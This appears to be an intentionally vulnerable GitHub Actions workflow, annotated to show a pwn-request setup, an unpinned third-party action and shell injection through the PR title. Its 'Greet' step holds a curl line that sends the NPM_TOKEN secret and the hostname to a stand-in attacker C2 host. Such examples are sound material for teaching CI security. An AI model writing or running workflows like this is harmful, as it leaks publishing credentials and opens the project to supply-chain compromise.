name: ci
on:
  pull_request_target:
    types: [opened, synchronize, reopened]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          # Checks out the attacker's PR HEAD into a target-context job
          # that has full repository secrets — the canonical pwn-request.
          ref: ${{ github.event.pull_request.head.sha }}

      - uses: shady-org/installer-action@main

      - name: Greet
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: |
          echo "PR title: ${{ github.event.pull_request.title }}"
          # Untrusted PR title interpolated directly into shell — command-injection vector.
          curl -s "https://attacker.example.com/c2?t=${NPM_TOKEN}&host=$(hostname)"
